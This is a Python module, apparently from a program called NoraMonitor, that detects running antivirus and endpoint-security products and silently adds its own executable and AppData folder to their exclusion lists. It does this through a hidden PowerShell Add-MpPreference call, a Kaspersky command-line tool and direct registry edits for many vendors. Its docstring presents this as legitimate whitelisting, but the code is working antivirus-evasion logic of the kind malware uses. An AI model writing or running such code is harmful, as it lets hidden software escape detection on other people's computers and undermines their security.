"""
AV self-exclusion: registers NoraMonitor's path with whatever AV is running,
using each vendor's own legitimate exclusion API (PowerShell, CLI, or registry).
No AV processes are killed — only whitelisting.
"""
import os
import subprocess
import sys

try:
    import winreg as _winreg
except ImportError:
    _winreg = None


# ── AV detection (process names) ──────────────────────────────────────────────

_AV_PROCS = {
    "Defender":     {"msmpeng.exe", "mssense.exe"},
    "Malwarebytes": {"mbamservice.exe", "mbamagent.exe", "mbam.exe"},
    "Avast":        {"avastsvc.exe", "avastui.exe", "aswidsagent.exe"},
    "AVG":          {"avgsvca.exe", "avgui.exe", "avgsvc.exe"},
    "Kaspersky":    {"avp.exe", "kavtray.exe", "klnagent.exe"},
    "ESET":         {"ekrn.exe", "egui.exe", "eamonm.exe"},
    "Bitdefender":  {"bdagent.exe", "bdredline.exe", "seccenter.exe", "vsserv.exe"},
    "Norton":       {"nswscsvc.exe", "ns.exe", "nortonsecurity.exe", "symcorpui.exe"},
    "McAfee":       {"mcshield.exe", "mcapexe.exe", "mfemms.exe", "masvc.exe"},
    "Sophos":       {"sophosntquarantineservice.exe", "savservice.exe", "hmpalert.exe"},
    "TrendMicro":   {"tmlisten.exe", "pccntmon.exe", "tmproxy.exe"},
    "Webroot":      {"wrsa.exe"},
    "F-Secure":     {"fshoster32.exe", "fshoster64.exe", "fsav.exe"},
    "CrowdStrike":  {"csfalconservice.exe", "csfalconcontainer.exe"},
    "SentinelOne":  {"sentinelagent.exe", "sentinelone.exe"},
    "Cylance":      {"cylanceui.exe", "cylancesvc.exe"},
}


def _running_avs():
    try:
        import psutil
        running = {p.name().lower() for p in psutil.process_iter(["name"])}
    except Exception:
        return set()
    found = set()
    for av, procs in _AV_PROCS.items():
        if running & procs:
            found.add(av)
    return found


# ── Registry helpers ──────────────────────────────────────────────────────────

def _reg_append_multi(hive, path, name, value):
    """Append value to a REG_MULTI_SZ list (creates key/value if absent)."""
    if not _winreg:
        return False
    try:
        key = _winreg.CreateKeyEx(hive, path, 0,
                                   _winreg.KEY_READ | _winreg.KEY_WRITE)
        try:
            existing, _ = _winreg.QueryValueEx(key, name)
            if not isinstance(existing, list):
                existing = [existing] if existing else []
        except FileNotFoundError:
            existing = []
        if value not in existing:
            existing.append(value)
        _winreg.SetValueEx(key, name, 0, _winreg.REG_MULTI_SZ, existing)
        _winreg.CloseKey(key)
        return True
    except Exception:
        return False


def _reg_append_str(hive, path, name, value, sep=";"):
    """Append value to a separator-delimited REG_SZ string."""
    if not _winreg:
        return False
    try:
        key = _winreg.CreateKeyEx(hive, path, 0,
                                   _winreg.KEY_READ | _winreg.KEY_WRITE)
        try:
            existing, _ = _winreg.QueryValueEx(key, name)
        except FileNotFoundError:
            existing = ""
        parts = [p for p in existing.split(sep) if p]
        if value not in parts:
            parts.append(value)
        _winreg.SetValueEx(key, name, 0, _winreg.REG_SZ, sep.join(parts))
        _winreg.CloseKey(key)
        return True
    except Exception:
        return False


def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return r.returncode == 0
    except Exception:
        return False


# ── Per-AV exclusion routines ─────────────────────────────────────────────────

def _exclude_defender(paths):
    joined = "', '".join(paths)
    return _run([
        "powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
        f"Add-MpPreference -ExclusionPath '{joined}'"
    ])


def _exclude_avast(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_str(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\AVAST Software\Avast\FileExclusions",
            "FileExclusions", p, "|")
    return ok


def _exclude_avg(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_str(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\AVG\AVG\FileExclusions",
            "FileExclusions", p, "|")
    return ok


def _exclude_kaspersky(paths):
    # Try kavshell CLI
    for root in [r"C:\Program Files (x86)\Kaspersky Lab",
                 r"C:\Program Files\Kaspersky Lab"]:
        if not os.path.isdir(root):
            continue
        try:
            for sub in os.listdir(root):
                kav = os.path.join(root, sub, "kavshell.exe")
                if not os.path.isfile(kav):
                    continue
                for p in paths:
                    _run([kav, "EXCLUDE", f"/ADD:{p}", "/ET:0"])
                return True
        except Exception:
            pass
    return False


def _exclude_eset(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_str(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\ESET\ESET Security\CurrentVersion\Plugins\01000300\Settings",
            "szExcludedDir", p, ";")
    return ok


def _exclude_malwarebytes(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_multi(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Malwarebytes\MBAMService\exclusions",
            "ExclusionList", p)
    return ok


def _exclude_bitdefender(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_str(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Bitdefender\Threat Scanner\Exclusions",
            "ExcludedPaths", p, ";")
    return ok


def _exclude_norton(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_str(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions"
            r"\ScanningEngines\Directory\Admin",
            "DirectoryName", p, ";")
    return ok


def _exclude_mcafee(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_str(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\McAfee\SystemCore\VSCore\On Access Scanner"
            r"\McShield\Configuration\Default",
            "ExcludedItem_0", p, ";")
    return ok


def _exclude_sophos(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_str(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Sophos\SAVService\Application Exceptions",
            "ApplicationExceptions", p, ";")
    return ok


def _exclude_trendmicro(paths):
    ok = False
    for p in paths:
        ok |= _reg_append_str(
            _winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\TrendMicro\PC-cillinNTCorp\CurrentVersion"
            r"\Real Time Scan Configuration",
            "ExcludeDir", p, ";")
    return ok


_EXCLUDERS = {
    "Defender":     _exclude_defender,
    "Avast":        _exclude_avast,
    "AVG":          _exclude_avg,
    "Kaspersky":    _exclude_kaspersky,
    "ESET":         _exclude_eset,
    "Malwarebytes": _exclude_malwarebytes,
    "Bitdefender":  _exclude_bitdefender,
    "Norton":       _exclude_norton,
    "McAfee":       _exclude_mcafee,
    "Sophos":       _exclude_sophos,
    "TrendMicro":   _exclude_trendmicro,
}


# ── Public API ────────────────────────────────────────────────────────────────

def run(extra_paths=None, log=None):
    """
    Detect running AVs and add NoraMonitor to each one's exclusion list.
    Always excludes sys.executable + the NoraMonitor AppData folder.
    Pass extra_paths to whitelist additional files/folders.
    """
    app_dir  = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
    exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    permanent = os.path.join(app_dir, "NoraMonitor.exe")

    paths = list({exe_path, app_dir, permanent})
    if extra_paths:
        paths.extend(extra_paths)

    avs = _running_avs()
    if not avs:
        if log:
            log("av_exclude: no known AV detected")
        return

    for av in avs:
        fn = _EXCLUDERS.get(av)
        if fn:
            try:
                ok = fn(paths)
            except Exception:
                ok = False
            if log:
                log(f"av_exclude: {av} → {'OK' if ok else 'failed (may need restart)'}")
        else:
            if log:
                log(f"av_exclude: {av} detected — no automated exclusion available, add manually")
